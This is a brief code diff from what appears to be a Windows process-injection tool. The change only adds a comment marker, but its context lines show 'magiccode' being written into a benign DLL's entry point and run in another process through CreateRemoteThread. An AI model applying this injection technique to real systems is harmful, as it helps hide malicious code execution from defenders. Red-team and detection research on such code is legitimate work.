@@ -169,6 +169,10 @@ int main(int argc, char *argv[])
     }
     printf("[+] magiccode written to DLL's entry point...\n");
 
+
+    //####END####
+    
+
     // execute magiccode from inside the benign DLL
     if (CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL) == NULL) {
         printf("[-] Failed to create remote thread for magiccode execution. Error: %lu\n", GetLastError());
